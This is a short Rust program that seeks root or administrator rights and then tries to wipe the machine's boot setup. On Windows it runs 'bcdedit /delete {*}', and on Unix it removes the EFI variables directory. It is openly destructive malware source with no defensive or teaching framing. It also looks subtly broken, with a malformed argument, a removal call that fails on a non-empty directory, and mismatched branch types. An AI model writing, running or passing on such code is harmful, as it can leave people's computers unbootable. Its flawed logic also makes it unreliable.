use std::fs;
use std::process::Command;

#[cfg(target_os = "windows")]
use is_elevated::is_elevated;

#[cfg(target_family = "unix")]
use sudo::escalate_if_needed;

fn main() {
    #[cfg(target_os = "windows")]
    if !is_elevated() {
        println!("User Account Control permissions not granted! Try running this from an elevated command prompt.");
    }

    #[cfg(target_family = "unix")]
    escalate_if_needed()
    .expect("Couldn't relaunch the program with root");


  let output = if cfg!(target_os = "windows") {
      Command::new("bcdedit")
              .args(["/delete {*}"])
              .output()
              .expect("failed to execute process")
} else {
    fs::remove_dir("/sys/firmware/efi/efivars")
    .expect("EFIVARS not mounted or write access denied.");
};
}
